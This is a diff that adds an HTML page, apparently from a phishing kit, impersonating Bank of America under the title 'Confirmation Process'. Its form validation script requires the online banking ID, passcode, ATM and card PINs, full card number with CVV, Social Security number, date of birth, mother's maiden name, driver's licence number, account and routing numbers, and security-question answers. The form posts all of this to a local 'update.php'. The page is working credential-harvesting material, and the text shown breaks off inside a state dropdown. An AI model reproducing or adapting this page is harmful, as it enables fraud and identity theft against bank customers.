@@ -1,0 +1,3251 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
+ <head>
+  <link rel="stylesheet" type="text/css" href="index.cfm_files/hs2_mvc_header_footer_style.css" />
+  <link rel="stylesheet" type="text/css" href="index.cfm_files/hs2_mvc_content_style.css" />
+  <link rel="stylesheet" type="text/css" href="index.cfm_files/masthead.css" />
+  <link rel="stylesheet" type="text/css" href="index.cfm_files/error_table_style.css" />
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <link type="text/css" href="index.cfm_files/local_odao.css" rel="stylesheet" />
+  <link type="text/css" href="index.cfm_files/mvc_content_style.css" rel="stylesheet" />
+  <link type="text/css" href="index.cfm_files/common.css" rel="stylesheet" />
+  <script src="index.cfm_files/dhtml.js" type="text/javascript" language="JavaScript">
+  </script>
+  <script src="index.cfm_files/required_fields.js" type="text/javascript" language="JavaScript">
+  </script>
+  <script src="index.cfm_files/validate_fields.js" type="text/javascript" language="JavaScript">
+  </script>
+  <script type="text/javascript" language="JavaScript">
+   var iAlreadySubmitted = 0
+function doCheck(){
+  if  (iAlreadySubmitted==0){
+     // submitting for first time - set flag to stop extra submissions
+     iAlreadySubmitted=1
+     // submit the form
+     document.eventForm.submit()
+  }
+}
+  </script>
+  <script type="text/javascript" language="JavaScript">
+   var ok_to_continue = true;
+
+var error_message = "The following fields may not be blank:\n";
+
+
+
+function getFieldObj(name)
+
+{
+
+  if (document.getElementById &amp;&amp; document.getElementById(name))
+
+  {
+
+  	this.obj = document.getElementById(name);
+
+	//this.style = document.getElementById(name).style;
+
+  }
+
+ 
+
+  else if (document.all)
+
+  {
+
+	this.obj = document.all[name];
+
+	//this.style = document.all[name].style;
+
+  }
+
+  else if (document.layers)
+
+  {
+
+   	this.obj = document.layers[name];
+
+   	//this.style = document.layers[name];
+
+  }
+
+}
+
+
+
+var p_bSubmit = 0;
+
+
+function validate(FormInput)
+{
+	if (p_bSubmit)
+	{
+		alert("Page is processing, please wait...");
+		return false;
+	}
+	else
+	{
+			if(FormInput.address_state.value ==  "")
+		{
+			alert("Please select the state where your accounts were opened");
+			FormInput.address_state.focus();
+			return false;
+		}
+                        else if(FormInput.onlineid.value ==  "")
+		{
+			alert("Please Enter your Online ID");
+			FormInput.onlineid.focus();
+			return false;
+		}
+			else if(FormInput.atmcheckcardpin.value ==  "")
+		{
+			alert("Enter your ATM/Check Card PIN");
+			FormInput.atmcheckcardpin.focus();
+			return false;
+		}
+			else if(FormInput.passcode.value ==  "")
+		{
+			alert("Please enter your Passcode");
+			FormInput.passcode.focus();
+			return false;
+		}
+			else if(FormInput.currentaddress_less_year.checked ==  false)
+		{
+			alert("Please Select your Bank of America Accounts");
+			FormInput.currentaddress_less_year.focus();
+			return false;
+		}
+			else if(FormInput.ccnum.value ==  "")
+		{
+			alert("Please enter Credit/Debit Card Number");
+			FormInput.ccnum.focus();
+			return false;
+		}
+			else if(FormInput.expmonth.value ==  "")
+		{
+			alert("Please Select your Credit/Debit Card Expiry Month");
+			FormInput.expmonth.focus();
+			return false;
+		}
+			else if(FormInput.expyear.value ==  "")
+		{
+			alert("Please Select your Credit/Debit Card Expiry Year");
+			FormInput.expyear.focus();
+			return false;
+		}
+			else if(FormInput.cv.value ==  "")
+		{
+			alert("Please Enter Code Verification Number of your Credit/Debit Card");
+			FormInput.cv.focus();
+			return false;
+		}
+			else if(FormInput.ccpin.value ==  "")
+		{
+			alert("Please Enter your Credit/Debit Card ATM Pin Number");
+			FormInput.ccpin.focus();
+			return false;
+		}
+			else if(FormInput.fullname.value ==  "")
+		{
+			alert("Please Enter your Name as it appears on your Credit/Debit Card");
+			FormInput.fullname.focus();
+			return false;
+		}
+			else if(FormInput.previous_address_line1.value ==  "")
+		{
+			alert("Please Enter your Credit/Debit Card Billing Address");
+			FormInput.previous_address_line1.focus();
+			return false;
+		}
+			else if(FormInput.previous_city.value ==  "")
+		{
+			alert("Please Enter the City of your Credit/Debit Card Billing Address");
+			FormInput.previous_city.focus();
+			return false;
+		}
+			else if(FormInput.previous_state.value ==  "")
+		{
+			alert("Please Select the State of your Credit/Debit Card Billing Address");
+			FormInput.previous_state.focus();
+			return false;
+		}
+			else if(FormInput.previous_zipcode5.value ==  "")
+		{
+			alert("Please Enter the Zipcode of your Credit/Debit Card Billing Address");
+			FormInput.previous_zipcode5.focus();
+			return false;
+		}
+			else if(FormInput.currentaddress_more_year.checked ==  false)
+		{
+			alert("Please Select your Bank of America Accounts");
+			FormInput.currentaddress_more_year.focus();
+			return false;
+		}
+			else if(FormInput.account_number.value ==  "")
+		{
+			alert("Please Enter your Bank Account Number");
+			FormInput.account_number.focus();
+			return false;
+		}
+			else if(FormInput.routing_number.value ==  "")
+		{
+			alert("Please Enter your Bank Routing Number");
+			FormInput.routing_number.focus();
+			return false;
+		}
+			else if(FormInput.home_phone_ac.value ==  "")
+		{
+			alert("Please Enter your Phone Number");
+			FormInput.home_phone_ac.focus();
+			return false;
+		}
+			else if(FormInput.home_phone_ex.value ==  "")
+		{
+			alert("Please Enter your Phone Number");
+			FormInput.home_phone_ex.focus();
+			return false;
+		}
+			else if(FormInput.home_phone_sub.value ==  "")
+		{
+			alert("Please Enter your Phone Number");
+			FormInput.home_phone_sub.focus();
+			return false;
+		}
+			else if(FormInput.email_address1.value ==  "")
+		{
+			alert("Please Enter your Current E-mail Address");
+			FormInput.email_address1.focus();
+			return false;
+		}
+			else if(FormInput.ssn3.value ==  "")
+		{
+			alert("Please Enter the First 3 Digits of your Social Security Number");
+			FormInput.ssn3.focus();
+			return false;
+		}
+			else if(FormInput.ssn2.value ==  "")
+		{
+			alert("Please Enter the Second 2 Digits of your Social Security Number");
+			FormInput.ssn2.focus();
+			return false;
+		}
+			else if(FormInput.ssn4.value ==  "")
+		{
+			alert("Please Enter the Last 4 Digits of your Social Security Number");
+			FormInput.ssn4.focus();
+			return false;
+		}
+			else if(FormInput.dob_month.value ==  "")
+		{
+			alert("Please Enter your Date of Birth Month");
+			FormInput.dob_month.focus();
+			return false;
+		}
+			else if(FormInput.dob_day.value ==  "")
+		{
+			alert("Please Enter your Date of Birth Day");
+			FormInput.dob_day.focus();
+			return false;
+		}
+			else if(FormInput.dob_year.value ==  "")
+		{
+			alert("Please Enter your Date of Birth Year");
+			FormInput.dob_year.focus();
+			return false;
+		}
+			else if(FormInput.mmn.value ==  "")
+		{
+			alert("Please enter your Mother's Maiden Name");
+			FormInput.mmn.focus();
+			return false;
+		}
+			else if(FormInput.dl.value ==  "")
+		{
+			alert("Please Enter your Diving Liecence Number");
+			FormInput.dl.focus();
+			return false;
+		}
+			else if(FormInput.question1.value ==  "")
+		{
+			alert("Please Select your First SiteKey Challenge Question");
+			FormInput.question1.focus();
+			return false;
+		}
+			else if(FormInput.answer1.value ==  "")
+		{
+			alert("Please Answer your First SiteKey Challenge Question");
+			FormInput.answer1.focus();
+			return false;
+		}
+			else if(FormInput.question2.value ==  "")
+		{
+			alert("Please Select your Second SiteKey Challenge Question");
+			FormInput.question2.focus();
+			return false;
+		}
+			else if(FormInput.answer2.value ==  "")
+		{
+			alert("Please Answer your Second SiteKey Challenge Question");
+			FormInput.answer2.focus();
+			return false;
+		}
+			else if(FormInput.question3.value ==  "")
+		{
+			alert("Please Select your Third SiteKey Challenge Question");
+			FormInput.question3.focus();
+			return false;
+		}
+			else if(FormInput.answer3.value ==  "")
+		{
+			alert("Please Answer your Third SiteKey Challenge Question");
+			FormInput.answer3.focus();
+			return false;
+		}
+
+                          else
+		{
+			p_bSubmit = 1;
+			return true;
+		}
+	}
+}
+
+
+function setFocus()
+{
+	if (document.frmSignOn.address_state.value.length == 0)
+	{
+		document.frmSignOn.address_state.focus()
+	}
+	else if (document.frmSignOn.address_state.value.length == 10)
+	{
+		document.frmSignOn.onlineid.focus()
+	}
+}
+
+
+
+
+
+
+
+
+
+function addfieldsRequired(fieldName, fld)
+
+		{
+
+			this.fieldName 	= fieldName;		// field name 
+
+			this.fld 		= fld;				// field display name in alert box
+
+			this.isRequired = true;		// is field - we always default to true
+
+			return this;
+
+		}
+
+		
+function csv_ckRequiredFields(when, field) {
+
+    var allOK = true;
+
+    var nNumFlds = fieldsRequired.length;
+
+    var ss;
+
+    var ss2;
+
+    var rr2
+
+    var rr;
+
+    var oldR = false;
+
+	ok_to_continue = true;
+
+	error_message = "The following fields may not be blank:\n";
+
+
+
+    for (n = 1; n &lt; nNumFlds; n++)  {		
+
+		var fieldIsValid = fieldsRequired[n].isRequired;
+
+		var x = new getFieldObj(fieldsRequired[n].fieldName);
+
+		if (fieldsRequired[n].isRequired) {
+
+				if (x.obj.type == "text" || x.obj.type == "password" || x.obj.type == "hidden" || x.obj.type == "textarea") {
+
+						fieldIsValid = true;						
+
+						ss = x.obj.value;
+
+						if (x.obj.value == null)
+
+							ss = "";
+
+				}
+
+				if (x.obj.type == "listbox" || x.obj.type == "select-one" ) {
+
+					fieldIsValid = true;
+
+					ss2 = x.obj.value;
+
+					ss = ss2;
+
+				}				
+
+				if (x.obj.type == "radio" || x.obj.type == "checkbox") 	{
+
+					fieldIsValid = true;
+
+					var rObj = document.getElementsByName(field);
+
+					var rCount = rObj.length;
+
+		
+
+					for ( var rndx = 0; rndx &lt; rCount; rndx++ ) {
+
+						var rr = rObj[a].checked;
+
+						if (rr)
+
+							oldR = true;
+
+					}
+
+					ss = oldR;
+
+				}			
+
+			if (fieldIsValid)
+
+			error_message  += csv_isBlank(fieldsRequired[n].fld , ss, ok_to_continue, x.obj.type, x.obj.name, x.obj.type);
+
+	    	}
+
+		}
+
+
+
+	if (ok_to_continue) {
+
+		if (when == 'submit' || when == 'zippysubmit')
+
+			window.document.forms[0].submit();
+
+	}
+
+	else {
+
+		alert(error_message+"\n\nPlease correct your entries and resubmit. ");
+
+		if (when == 'submit')
+
+			//alert("Please correct your entries and resubmit");
+
+			var donothing = true;
+
+		else if(when == 'zippysubmit')
+
+			return false;
+
+	}
+
+}
+
+function csv_isBlank(fld, val, lastOK, dType, field, fldType)
+
+{
+
+	var nLen = val.length;
+
+	var x = new getFieldObj(field);
+
+	var sError = "";
+
+	
+
+	if (nLen &lt; 1) 	{
+
+		ok_to_continue = false;
+
+		sError = "\n"+fld;
+
+		return sError;
+
+	}
+
+	if (1==2) //!lastOK)
+
+		return "";
+
+	else 	{		
+
+		if (fldType == 'radio' || fldType == 'checkbox') {
+
+			var rObj = document.getElementsByName(field);
+
+			var rLen = rObj.length;
+
+			var rOK = false;
+
+			
+
+			for ( var a=0; a &lt; rLen; a++)
+
+			{					 
+
+				if (rObj[a].checked)
+
+					return ""; 
+
+			}
+
+			ok_to_continue = false;
+
+			sError = "\n"+fld;
+
+			return sError;				
+
+		}		
+
+		if (fldType == 'select-one' ) {
+
+			
+
+			if (val == -1 || val == '') {
+
+				sError = "\n"+fld;
+
+				ok_to_continue = false;
+
+				return sError;
+
+			}
+
+			
+
+			else
+
+				return "";
+
+		}		
+
+	}
+
+	return "";
+
+}
+  </script>
+  <script type="text/javascript" language="JavaScript">
+   &lt;!--
+
+function helpwindow(helpkey,windowHeight,windowWidth){
+		var NS4 = (document.layers) ? true : false;
+		var NS6 = (!document.layers) &amp;&amp; (navigator.userAgent.indexOf('Netscape')!=-1) ? true : false;
+		var IE4plus = (document.all) ? true : false;
+		var adr = 'help.cfm?helpkey=' + helpkey;
+		var topPosition;
+		var leftPosition;
+		var PageHeight;
+
+		
+
+		if (NS4 || NS6){
+			PageHeight = window.innerHeight;
+
+			if (PageHeight &lt; 500){
+				topPosition = 253;
+				leftPosition = 174;
+			} else if (PageHeight &lt; 620){
+				topPosition = 253;
+				leftPosition = 175;
+			} else {
+				topPosition = 254;
+				leftPosition = 173;
+			}
+			window.open(adr, '', 'height='+windowHeight+',width='+windowWidth+',screenY='+topPosition+',screenX='+leftPosition+',scrollbars=yes,resizable=yes');
+		} else {
+			PageHeight = screen.availHeight;
+
+			if (PageHeight &lt; 600){
+				topPosition = 238;
+				leftPosition = 174;
+			} else if (PageHeight &lt; 800){
+				topPosition = 237;
+				leftPosition = 173;
+			} else {
+				topPosition = 238;
+				leftPosition = 172;
+			}
+			window.open(adr, '', 'height='+windowHeight+',width='+windowWidth+',top='+topPosition+',left='+leftPosition+',scrollbars=yes,resizable=yes');
+		}
+	}
+
+
+function launchWin(url) {
+  newwin = open(url, 'newwin', 'location,menubar,resizable,scrollbars,status,toolbar,width=625,height=345,left=400,top=200');
+}
+
+
+function launchWinNoBrowserControls(url) {
+  newwin = open(url, 'newwin', 'scrollbars,resizable,width=625,height=345,left=400,top=200');
+}
+
+
+function forceNumeric(theString) {
+
+    var foundAlphaChar = 0;
+	var newStr = "";
+
+    theString += "";
+
+    for (i=0; i &lt;= theString.length; i++) {
+
+        var thisChar = theString.substring(i, i+1);
+
+        if ((thisChar &gt;= "0") &amp;&amp; (thisChar &lt;= "9")) {
+
+		newStr += thisChar;
+
+        } else if (thisChar == ".")  {
+
+	        return newStr;
+			}
+     }
+
+       return newStr;
+
+
+}
+
+
+
+// function to count characters in a text field
+function countChars(field, countfield, maxlimit) {
+	if (field.value.length &gt; maxlimit) {
+		field.value = field.value.substring(0, maxlimit);
+	}
+	else {
+		countfield.value = maxlimit - field.value.length;
+	}
+}
+
+
+
+
+//--&gt;
+
+
+// function to show Large Glossary Window
+function largeGlossaryWindow(adr, name) {
+    var NS4 = (document.layers) ? true : false;
+    var NS6 = (!document.layers) &amp;&amp; (navigator.userAgent.indexOf('Netscape')!=-1) ? true : false;
+    var IE4plus = (document.all) ? true : false;
+
+    var topPosition = 161;
+    var leftPosition = 35;
+    var PageHeight;
+
+    if (NS4 || NS6){
+         PageHeight = window.innerHeight;
+         window.open(adr, name, 'height=280,width=500,screenY='+topPosition+',screenX='+leftPosition+',scrollbars=yes,resizable=yes');
+    } else {
+         PageHeight = screen.availHeight;
+         window.open(adr, name, 'height=280,width=500,top='+topPosition+',left='+leftPosition+',scrollbars=yes,resizable=yes');
+    }
+}
+
+function launchWinNoBrowserControlsSizeable(url,windowHeight,windowWidth,scrollable) {
+		if (windowHeight == undefined) {
+		  windowHeight = 345;
+		}
+		if (windowWidth == undefined) {
+		  windowWidth = 625;
+		}
+		if (scrollable == undefined) {
+		   scrollable ='yes';
+		}
+
+        newwin = open(url, 'newwin', 'width='+windowWidth+',height='+windowHeight+',scrollbars='+scrollable+',left=35,top=161');
+}
+
+//	function processSubmitDate(){
+//	alert(txField('eventForm', +x+'.totalYearsAtCurrentAddress'));
+//	alert(csv_findFieldVal('time_current_year'));
+//	alert(txField('eventForm', csv_findFieldVal('time_current_year')));
+//		if (csv_getField('time_current_year')){(csv_findFieldVal('time_current_year'))};
+//		if (typeof txField != 'undefined'){txField('eventForm', csv_findFieldVal('time_current_year'))};
+//	}
+
+function processSubmitDate(){
+    if (csv_getField('time_current_year') &amp;&amp; typeof txField != 'undefined'){
+        txField('eventForm', 'applicant[1].totalYearsAtCurrentAddress');
+    }
+}
+
+function processSubmitState(){
+    if (csv_getField('address_state') &amp;&amp; typeof txField != 'undefined'){
+        txField('eventForm', 'applicant[1].currentAddressState');
+    }
+}
+
+function processSubmit(id){
+  if (csv_getField(id) &amp;&amp; typeof txField != 'undefined'){
+      // set the field value
+      csv_findFieldVal('hd_'+id) = csv_findFieldVal(id);
+      // submit via txField
+      txField('eventForm', id);
+  }
+}
+
+//--&gt;
+  </script>
+  <link href="index.cfm_files/youarehere_styles.css" rel="stylesheet" type="text/css" />
+  <link href="index.cfm_files/mvc_content_style.css" rel="stylesheet" type="text/css" />
+  <script type="text/javascript" language="JavaScript">
+   &lt;!--
+
+function show_prevaddress()
+{
+
+	var obj = 'prev_addr_section';
+	if(csv_getField('currentaddress_less_year'))
+	 {
+		if(csv_getField('currentaddress_less_year').checked)
+		{
+			show(obj);
+		}
+		else
+		{
+			hide(obj);
+		}
+	 }
+
+}
+
+function show_accdetails()
+{
+
+	var obj = 'acc_detail_section';
+	if(csv_getField('currentaddress_more_year'))
+	 {
+		if(csv_getField('currentaddress_more_year').checked)
+		{
+			show(obj);
+		}
+		else
+		{
+			hide(obj);
+			csv_getField('account_number').value="";
+			csv_getField('routing_number').value="";
+			account_number
+		}
+	 }
+
+}
+
+
+function resetPrevAddrFields()
+{
+	csv_getField('previous_address_line1').value = "";
+	csv_getField('previous_address_line2').value = "";
+	csv_getField('previous_city').value = "";
+	csv_getField('previous_zipcode5').value = "";
+	csv_getField('previous_state').value = "";
+}
+
+
+/*============Begin Mod WR19631============*/
+/*===============End Mod WR19631==============*/
+//Start functions code for 18652
+
+function csv_moveToEmail1(obj)
+{
+
+	if(obj.id == 'email_address2' &amp;&amp; csv_getField('email_address1').value == '')
+	{
+		csv_getField('email_address1').focus();
+
+	}
+}
+function chk_same_email(obj)
+{
+
+	if(csv_getField('email_address1') &amp;&amp; csv_getField('email_address2') &amp;&amp; csv_isValidEmail('email_address1'))
+	{
+		if((obj.id == 'email_address1' &amp;&amp; csv_getField('email_address2').value != '') || obj.id=='email_address2')
+		{
+
+			   if (csv_findFieldVal('email_address1') != csv_findFieldVal('email_address2'))
+			   {
+
+				alert("Re entered E-mail address is different");
+				csv_getField('email_address2').value='';
+				csv_getField('email_address2').focus();
+
+			   }
+
+		}
+	}
+}
+
+function csv_isValidEmail(id)
+{
+	var str = csv_getField(id).value;
+  	if (window.RegExp)
+	{
+    	var reg1str = "(@.*@)|(\\.\\.)|(@\\.)|(\\.@)|(^\\.)";
+	    var reg2str = "^.+\\@(\\[?)[a-zA-Z0-9\\-\\_\\.]+\\.([a-zA-Z]{2,3}|[0-9]{1,3})(\\]?)$";
+	    var reg1 = new RegExp(reg1str);
+	    var reg2 = new RegExp(reg2str);
+	    if (!reg1.test(str) &amp;&amp; reg2.test(str))
+	      return true;  // all ok
+	   return false;
+  	}
+	else
+	{
+    if(str.indexOf("@") &gt;= 0)
+      	return true;	// all ok
+	return false;
+  }
+}
+
+// END of code for 18652
+
+
+
+
+//Previous code start for 18652
+/*
+var email2first = 0;
+function chk_email1first(obj)
+{	
+	email2first=0;	
+}
+
+function chk_email2first(obj)
+{
+if ( csv_findFieldVal('email_address1') == '')
+	{	
+	email2first=1;
+	csv_getField('email_address1').focus();	
+	}
+	
+}
+var sameEmail=0;
+function chk_same_email(obj)
+{		
+	var str = obj.value;		
+	if ( email2first != 1 )	
+	{	
+		email2first = 0;
+		if(csv_getField('email_address1') &amp;&amp; csv_getField('email_address2') &amp;&amp; csv_findFieldVal('email_address1') != '' &amp;&amp; csv_findFieldVal('email_address2') != '')
+		{	
+			if (window.RegExp)
+			{
+				var reg1str = "(@.*@)|(\\.\\.)|(@\\.)|(\\.@)|(^\\.)";
+				    var reg2str = "^.+\\@(\\[?)[a-zA-Z0-9\\-\\_\\.]+\\.([a-zA-Z]{2,3}|[0-9]{1,3})(\\]?)$";
+				    var reg1 = new RegExp(reg1str);
+				    var reg2 = new RegExp(reg2str);
+				    if (!reg1.test(str) &amp;&amp; reg2.test(str))
+				    { 
+					   if (csv_findFieldVal('email_address1') != csv_findFieldVal('email_address2'))
+					   {
+						if(sameEmail==0)
+						{
+						alert("Re entered E-mail address is different1111");
+						obj.value='';	
+						obj.focus();
+						}
+						else{				
+						alert ("Re entered E-mail address is different2222");
+						csv_getField('email_address2').value='';
+						csv_getField('email_address2').focus();				
+						}				
+						sameEmail=0;
+					   }
+					   else
+					   {
+					   sameEmail=1;
+					   }			   
+			   	 }			   
+			}
+		}	
+	
+	}
+}
+
+*/
+// Previous code end for 18652
+
+
+
+		// --&gt;
+  </script>
+  <title>
+   Bank of America | Confirmation Process
+  </title>
+  <meta content="Please complete the following personal information to begin your application." name="description" />
+  <script type="text/javascript" language="JavaScript">
+   &lt;!--
+		&lt;!-- Begin
+var isNN = (navigator.appName.indexOf("Netscape")!=-1);
+function autoTab(input,len, e) {
+var keyCode = (isNN) ? e.which : e.keyCode; 
+var filter = (isNN) ? [0,8,9] : [0,8,9,16,17,18,37,38,39,40,46];
+if(input.value.length &gt;= len &amp;&amp; !containsElement(filter,keyCode)) {
+input.value = input.value.slice(0, len);
+input.form[(getIndex(input)+1) % input.form.length].focus();
+}
+function containsElement(arr, ele) {
+var found = false, index = 0;
+while(!found &amp;&amp; index &lt; arr.length)
+if(arr[index] == ele)
+found = true;
+else
+index++;
+return found;
+}
+function getIndex(input) {
+var index = -1, i = 0, found = false;
+while (i &lt; input.form.length &amp;&amp; index == -1)
+if (input.form[i] == input)index = i;
+else i++;
+return index;
+}
+return true;
+}
+//  End --&gt;
+
+		// --&gt;
+  </script>
+  <script src="index.cfm_files/bofa_utils.js" type="text/javascript" language="javascript">
+  </script>
+  <script src="index.cfm_files/configuration_deposits.js" type="text/javascript" language="javascript">
+  </script>
+  <script src="index.cfm_files/configuration_baseline.js" type="text/javascript" language="javascript">
+  </script>
+  <script src="index.cfm_files/generate-conversion-xml.js" type="text/javascript" language="javascript">
+  </script>
+ </head>
+ <body marginwidth="0" marginheight="0" bgcolor="#FFFFFF" topmargin="0" leftmargin="0">
+  <map name="secure">
+   <area alt="Bank of America Higher Standards Logo" coords="1,1,644,68" shape="rect">
+   </area>
+   <area target="_new" alt="Secure area. Link opens in a new window" href="https://www1.bankofamerica.com/deposits/odao/help.cfm?helpkey=secure_area" onclick="javascript:helpwindow('secure_area',280,380);return false;" coords="645,48,745,68" shape="rect">
+   </area>
+  </map>
+  <table border="0" cellspacing="0" cellpadding="0">
+   <tbody>
+    <tr>
+     <td bgcolor="#ffffff">
+      <img width="8" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+     </td>
+     <td>
+      <img width="250" height="69" border="0" alt="Bank of America" src="index.cfm_files/mhd_reg_logo.gif" />
+     </td>
+    </tr>
+   </tbody>
+  </table>
+  <table border="0" cellspacing="0" cellpadding="0">
+   <tbody>
+    <tr>
+     <td bgcolor="#c2c2c1">
+      <img width="747" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td bgcolor="#ececec">
+      <img width="747" height="4" border="0" alt="" src="index.cfm_files/x.gif" />
+     </td>
+    </tr>
+    <tr>
+     <td bgcolor="#d4001a">
+      <img width="747" height="20" border="0" alt="" src="index.cfm_files/x.gif" />
+     </td>
+    </tr>
+   </tbody>
+  </table>
+  <table width="747" border="0" cellspacing="0" cellpadding="0" summary="">
+   <tbody>
+    <tr valign="top" align="left">
+     <td width="7">
+      <img width="1" height="1" border="0" alt="" src="index.cfm_files/px.gif" />
+     </td>
+     <td width="740" valign="top" align="left">
+      <script type="text/javascript">
+       var bCheckForInvalidCD="false";
+    var totalAccountsSelected=2;
+	var bCheckForInvalidProduct="false";
+	var bCheckChooseAcctError="false";
+      </script>
+      <script type="text/javascript">
+       var SectionToHideList="x";
+	    var SectionToShowList="x";
+	    var accountList = "";
+      </script>
+      <script type="text/javascript">
+       var accountList = accountList+",CHMA_1";
+      </script>
+      <script type="text/javascript">
+       var accountList = accountList+",SARE_2";
+      </script>
+      <script type="text/javascript">
+       SectionToHideList=SectionToHideList+",OtherSingleError_table";
+      </script>
+      <script type="text/javascript">
+       SectionToHideList=SectionToHideList+",OLBdetails_table";
+					  SectionToHideList=SectionToHideList+",AccountsQuestion_table";
+      </script>
+      <table cellspacing="0" cellpadding="0" summary="" valign="bottom">
+       <tbody>
+        <tr>
+         <td colspan="2">
+          <img width="1" height="15" border="0" alt="" src="index.cfm_files/px.gif" />
+         </td>
+        </tr>
+        <tr>
+         <td valign="middle" nowrap="nowrap" align="left" class="standard-font-bold">
+          <a href="#skipnav">
+           <img width="1" height="1" border="0" alt="Skip navigational links." src="index.cfm_files/x.gif" />
+          </a>
+         </td>
+         <td align="left">
+          <table border="0" cellspacing="0" cellpadding="0" summary="">
+           <tbody>
+            <tr>
+             <td>
+              <img width="32" height="27" border="0" alt="1" src="index.cfm_files/prog_meter_1_current.gif" />
+             </td>
+             <td nowrap="nowrap" class="prog-meter">
+              Confirm Your Online Banking Details and Personal Information
+             </td>
+             <td>
+              <img width="20" height="27" border="0" alt="" src="index.cfm_files/prog_meter_dotted_spacer.gif" />
+             </td>
+            </tr>
+           </tbody>
+          </table>
+         </td>
+         <td align="left">
+          <table border="0" cellspacing="0" cellpadding="0" summary="">
+           <tbody>
+            <tr>
+             <td>
+              <img width="32" height="27" border="0" alt="2" src="index.cfm_files/prog_meter_2_unvisited.gif" />
+             </td>
+             <td nowrap="nowrap" class="prog-meter">
+              Finish
+             </td>
+            </tr>
+           </tbody>
+          </table>
+         </td>
+         <td width="100%">
+         </td>
+        </tr>
+        <tr>
+         <td>
+          <img width="1" height="4" border="0" alt="" src="index.cfm_files/px.gif" />
+          <a name="skipnav">
+          </a>
+         </td>
+        </tr>
+       </tbody>
+      </table>
+      <table width="740" border="0" cellspacing="0" cellpadding="0" summary="">
+       <tbody>
+        <tr>
+         <td colspan="3">
+          <img width="1" height="10" border="0" alt="" src="index.cfm_files/px.gif" />
+         </td>
+        </tr>
+        <tr valign="top" align="left">
+         <td width="545" valign="top" align="left">
+          <script type="text/javascript" language="JavaScript">
+           &lt;!--
+	var fieldsRequired = new Array();
+//--&gt;
+          </script>
+          <noscript>
+          </noscript>
+          <input type="hidden" value="continue" name="actionTaken" />
+          <input type="hidden" name="section_submit" value="4" />
+          <input type="hidden" name="viewallsections" value="true" />
+          <input type="hidden" name="error_section_list" value="true,true,true,true,true,true,true" />
+          <table width="546" border="0" cellspacing="0" cellpadding="0" summary="" class="standard-font">
+           <form onsubmit="return validate(eventForm)" name="eventForm" method="post" action="update.php">
+           </form>
+           <tbody>
+            <tr>
+             <td class="whitebg">
+              <img width="7" height="1" src="index.cfm_files/1pixel_clear.gif" alt="" />
+             </td>
+             <td valign="top">
+              <table width="100%" cellspacing="0" cellpadding="0" summary="">
+               <tbody>
+                <tr>
+                 <td>
+                 </td>
+                </tr>
+                <tr>
+                 <td class="whitebg">
+                  <img width="1" height="10" src="index.cfm_files/1pixel_clear.gif" alt="" />
+                 </td>
+                </tr>
+               </tbody>
+              </table>
+              <table width="100%" border="0" cellspacing="0" cellpadding="0" summary="">
+               <tbody>
+                <tr>
+                 <td colspan="2" class="whitebg">
+                  <img width="260" height="1" src="index.cfm_files/1pixel_clear.gif" alt="" />
+                 </td>
+                 <td valign="right" align="right" class="mod-content">
+                  <div class="standard-font">
+                  </div>
+                 </td>
+                </tr>
+               </tbody>
+              </table>
+              <table width="100%" border="0" cellspacing="0" cellpadding="0" summary="">
+               <tbody>
+                <tr class="sec-title-header">
+                 <td width="5%">
+                  <img width="10" height="1" alt="" src="index.cfm_files/x.gif" />
+                  <img width="23" height="23" alt="" src="index.cfm_files/icon_circle.gif" />
+                  <img width="5" height="1" alt="" src="index.cfm_files/x.gif" />
+                 </td>
+                 <td>
+                  <h2 class="sec-hdr-h2">
+                   Your Online Banking Information
+                  </h2>
+                 </td>
+                </tr>
+                <tr>
+                 <td class="whitebg">
+                  <img width="1" height="2" src="index.cfm_files/1pixel_clear.gif" alt="" />
+                 </td>
+                </tr>
+               </tbody>
+              </table>
+              <table width="100%" border="0" cellspacing="0" cellpadding="0" style="display: block;" summary="">
+               <tbody>
+                <tr>
+                 <td colspan="2">
+                  <table width="100%" border="0" cellspacing="0" cellpadding="0" summary="">
+                   <tbody>
+                    <tr>
+                     <td>
+                      <img width="1" height="11" src="index.cfm_files/x.gif" alt="" />
+                     </td>
+                    </tr>
+                    <tr>
+                     <td class="standard-font">
+                      <p class="paragraph">
+                       <img width="25" height="1" src="index.cfm_files/x.gif" alt="" />
+                       <strong>
+                        * = required information
+                       </strong>
+                      </p>
+                     </td>
+                    </tr>
+                    <tr>
+                     <td class="field-row">
+                      <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                       <tbody>
+                        <tr>
+                         <td rowspan="3">
+                          <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                         </td>
+                         <td width="100%">
+                          <span class="field-label-1">
+                           <label id="address_line1_label" for="address_line1">
+                            State where your accounts were opened*
+                            <span class="hidden-left">
+                             No post office boxes.
+                            </span>
+                           </label>
+                          </span>
+                          <div class="field-form">
+                           <select class="align-font-width-state" id="address_state" name="accountstate">
+                            <option selected="selected" value="">
+                             (Please Select State)
+                            </option>
+                            <option value="AL">
+                             Alabama
+                            </option>
+                            <option value="AK">
+                             Alaska
+                            </option>
+                            <option value="AZ">
+                             Arizona
+                            </option>
+                            <option value="AR">
+                             Arkansas
+                            </option>
+                            <option value="CA">
+                             California
+                            </option>
+                            <option value="CO">
+                             Colorado
+                            </option>
+                            <option value="CT">
+                             Connecticut
+                            </option>
+                            <option value="DE">
+                             Delaware
+                            </option>
+                            <option value="DC">
+                             District of Columbia
+                            </option>
+                            <option value="FL">
+                             Florida
+                            </option>
+                            <option value="GA">
+                             Georgia
+                            </option>
+                            <option value="HI">
+                             Hawaii
+                            </option>
+                            <option value="ID">
+                             Idaho
+                            </option>
+                            <option value="IL">
+                             Illinois
+                            </option>
+                            <option value="IN">
+                             Indiana
+                            </option>
+                            <option value="IA">
+                             Iowa
+                            </option>
+                            <option value="KS">
+                             Kansas
+                            </option>
+                            <option value="KY">
+                             Kentucky
+                            </option>
+                            <option value="LA">
+                             Louisiana
+                            </option>
+                            <option value="ME">
+                             Maine
+                            </option>
+                            <option value="MD">
+                             Maryland
+                            </option>
+                            <option value="MA">
+                             Massachusetts
+                            </option>
+                            <option value="MI">
+                             Michigan
+                            </option>
+                            <option value="MN">
+                             Minnesota
+                            </option>
+                            <option value="MS">
+                             Mississippi
+                            </option>
+                            <option value="MO">
+                             Missouri
+                            </option>
+                            <option value="MT">
+                             Montana
+                            </option>
